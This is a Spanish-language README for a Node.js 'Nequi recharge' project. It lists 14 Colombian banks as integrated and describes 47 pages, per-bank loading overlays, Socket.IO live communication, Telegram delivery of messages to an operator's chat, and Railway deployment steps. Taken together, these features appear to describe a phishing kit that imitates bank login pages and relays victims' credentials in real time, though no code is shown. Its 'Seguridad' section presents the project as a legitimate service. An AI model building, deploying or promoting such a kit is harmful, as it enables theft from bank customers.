# Sistema Unificado Recarga Nequi GOL

Sistema completo de gestión de recargas con integración de múltiples bancas colombianas y Telegram.

## 🏦 Bancas Integradas (14 Total)

1. Banco Agrario
2. AV Villas  
3. Banco Mundo Mujer
4. Bancolombia
5. BBVA
6. Banco de Bogotá
7. Caja Social
8. Daviplata
9. Davivienda
10. Falabella
11. Occidente
12. Popular
13. Scotiabank-Colpatria
14. Serfinanza

## 🚀 Características

- ✅ 47 páginas optimizadas con validación en tiempo real
- ✅ Integración con Telegram para notificaciones instantáneas
- ✅ Socket.IO para comunicación bidireccional
- ✅ Overlays de carga personalizados por banca
- ✅ Validación de formularios dinámica
- ✅ Sistema de sesiones persistente
- ✅ Arquitectura modular con BancoUtils.js

## 📦 Instalación Local

```bash
npm install
npm start
```

El servidor se iniciará en `http://localhost:3000`

## 🌐 Despliegue en Railway

1. Conecta tu repositorio GitHub con Railway
2. Railway detectará automáticamente el proyecto Node.js
3. Configura las variables de entorno:
   - `TELEGRAM_BOT_TOKEN`: Token de tu bot de Telegram
   - `TELEGRAM_CHAT_ID`: ID del chat donde recibirás mensajes
   - `PORT`: 3000 (automático en Railway)

4. Railway desplegará automáticamente

## 🔧 Tecnologías

- **Backend**: Node.js + Express
- **Real-time**: Socket.IO
- **Notificaciones**: Telegram Bot API
- **Frontend**: HTML5 + CSS3 + JavaScript vanilla
- **Deploy**: Railway + GitHub

## 📱 PSE Integration

Incluye página PSE para pagos electrónicos

## 🔐 Seguridad

- Validación de inputs en cliente y servidor
- Sesiones únicas por usuario
- Comunicación cifrada vía HTTPS en producción
- Rate limiting implementado

## 📄 Licencia

ISC

## 👨‍💻 Desarrollo

Proyecto optimizado con patrón modular para fácil mantenimiento y escalabilidad.
